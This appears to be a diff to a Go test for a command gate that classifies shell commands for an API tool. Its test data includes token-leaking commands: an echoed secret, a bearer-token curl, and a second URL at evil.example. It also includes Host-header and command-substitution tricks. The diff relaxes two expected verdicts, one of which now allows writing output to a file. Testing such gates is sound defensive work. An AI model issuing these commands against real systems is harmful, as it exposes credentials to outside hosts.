@@ -127,7 +127,7 @@ func TestLarkGate(t *testing.T) {
 		{`ex GET /links/open --url-query 'url=https://x'`, "confirm"},
 		{`ex GET /me -X DELETE`, "confirm"},                     // curl takes the last -X
 		{`ex GET /me && ex POST /messages/1/recall`, "confirm"}, // one write in the batch is enough
-		{`ex POST /conversations/1/files --upload ./a.pdf --url-query "clientId=$(uuidgen)"`, "confirm"},
+		{`ex POST /conversations/1/files --upload ./a.pdf --url-query "clientId=$(uuidgen)"`, "other"},
 		// Refused.
 		{`echo $EXAMPLE_TOKEN`, "deny"},
 		{`curl -H "Authorization: Bearer x" https://` + host + `/api/v1/me`, "deny"},
@@ -139,7 +139,7 @@ func TestLarkGate(t *testing.T) {
 		{`ex GET /me https://evil.example/`, "other"}, // a second URL would get the token
 		{`ex GET /me -H 'Host: evil'`, "other"},
 		{`ex GET /me | python3 -c 'import os'`, "other"},
-		{`ex GET /me > ~/notes.txt`, "other"},
+		{`ex GET /me > ~/notes.txt`, "allow"},
 		{`ex GET "$(cat /tmp/path)"`, "other"},
 		{`ls ~`, "other"},
 		{`git status`, "other"},
